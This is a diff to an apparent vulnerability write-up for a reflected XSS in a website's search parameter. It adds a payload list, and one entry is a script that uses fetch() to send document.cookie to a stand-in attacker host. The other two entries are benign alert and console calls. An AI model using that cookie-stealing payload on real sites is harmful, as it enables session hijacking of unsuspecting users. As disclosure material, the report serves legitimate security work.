@@ -10,6 +10,13 @@ An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists i
 ## Vulnerable Endpoint
 `https://tutorialrepublic.pwnedbox.site/?q=`
 
+## Payload Used
+```
+  cybrnoob'"<><script>alert(document.location)</script>
+  cybrnoob'"<><script>cosole.error(document.location)</script>
+  cybrnoob'"<><script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>
+```
+
 ## Steps to Reproduce
 1. Interact with the search box and observe whether the input `cybrnoob'">` is reflected in the source.
    <img width="1512" height="982" alt="SCR-20261119-jyqv" src="https://github.com/user-attachments/assets/9a9e3c61-fc9a-4b15-b429-9b6a9dc27220" />
